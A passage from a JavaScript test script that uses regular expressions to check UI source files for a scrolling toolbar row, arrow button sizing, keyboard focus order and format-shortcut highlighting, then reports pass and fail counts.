  check("no scrollbar, and a focused control clears the fade", /\[scrollbar-width:none\]/.test(row) && /scrollPaddingInline/.test(row))
  const rte = read("components/app/rich-text-editor.tsx")
  const bar = read("components/email/compose/format-bar.tsx")
  const builder = read("components/website-builder/rich-text-field.tsx")
  check("the description field, the email composer's bar and the builder's field all use it",
    /<ScrollRow/.test(rte) && (bar.match(/<ScrollRow/g) ?? []).length === 2 && /<ScrollRow/.test(builder))
  check("each arrow is as big a target as the controls beside it", /arrowClassName="w-11 sm:w-8"/.test(rte) && /const ARROW = "w-11 md:w-8"/.test(bar))
  check("the arrows are not in the toolbar's arrow key order", /button:not\(\[disabled\]\):not\(\[data-scroll-arrow\]\)/.test(rte))
  check("a shortcut lights its control at once", /type\?\.startsWith\("format"\)\) readActive\(\)/.test(rte))
}

console.log(`\n${passed} passed, ${failed} failed`)
if (failed > 0) {
  console.log(`\nFailed:\n${failures.map((f) => `  - ${f}`).join("\n")}`)
  process.exit(1)
}
